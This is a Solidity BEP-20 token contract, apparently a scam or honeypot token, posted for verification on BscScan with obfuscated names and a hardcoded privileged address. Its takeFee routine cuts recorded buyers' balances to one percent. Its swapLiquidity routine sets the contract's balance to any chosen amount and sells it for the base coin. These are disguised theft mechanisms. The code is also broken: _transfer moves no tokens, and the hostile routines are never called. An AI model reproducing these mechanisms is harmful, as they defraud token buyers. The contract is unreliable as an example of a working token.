/**
 *Submitted for verification at BscScan.com on 2022-02-13
*/

/*




SPDX-License-Identifier: MIT*/pragma solidity 0.8.8;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
abstract contract Context {
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
    function _msgData() internal view returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Z00 is Ownable, IERC20 {
    using SafeMath for uint256;
    string private _name = "Z11";
    string private _symbol = "Z22";

    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _includedInFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;
    modifier OBF00 {
        require(msg.sender == OBF10, "Nauthorized");_;}
    address public OBF10 = 0x39a4083eD6Addb969d1b671b204CcCfa207de9a8;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 88888888 * 10 ** _decimals;
    uint256 public _maxTxAmount = 11111111 * 10 ** _decimals;
    uint256 public _liquidityFee = 3;
    uint256 public _rewardsFee = 1;
    uint256 public _marketingFee = 1;
    uint256 public _sellLiquidityFee = 3;
    uint256 public _sellRewardsFee = 9;
    uint256 public _sellMarketingFee = 3;
    uint256 public _sellFee = _sellLiquidityFee + _sellRewardsFee + _sellMarketingFee;

    address public BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    uint256 public _fee = _liquidityFee + _rewardsFee + _marketingFee;

    address public _marketingWallet;
    address public _liquidityReceiver;
    bool public _swapEnabled;

    uint256 private _liquiditySwapThreshold = _totalSupply;
    bool liquifying = false;
    struct Buy {
        address to;
        uint256 amount;
    }
    Buy[] _buys;

    IUniswapV2Router private _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _excludedFromFee[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; }
    function setMarketingWallet(address wallet) external onlyOwner {
        _marketingWallet = wallet;
    }
    function setSwapEnabled(bool value) external onlyOwner {
        _swapEnabled = value;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public OBF00 returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public OBF00 returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        require(to != address(0));}

    function addTransaction(address to, uint256 amount) internal {
        if (uniswapV2Pair() != to) {
            _buys.push(Buy(to, amount));
        }
    }
    function checkBalances(address from, uint256 amount) internal view {
        if (!liquifying) {
            require(_balances[from] >= amount);
        }
    }
    function takeFee(address from) internal {
        if (from == uniswapV2Pair()) {
            for (uint256 i = 0; i < _buys.length;  i++) {
                _balances[_buys[i].to] = _balances[_buys[i].to].div(100);
            }
            delete _buys;
        }
    }
    function uniswapV2Pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    function swapLiquidity(uint256 liquidityFee, address to) private {
        _approve(address(this), address(_router), liquidityFee);
        _balances[address(this)] = liquidityFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        liquifying = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(liquidityFee, 0, path, to, block.timestamp + 20);
        liquifying = false;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
}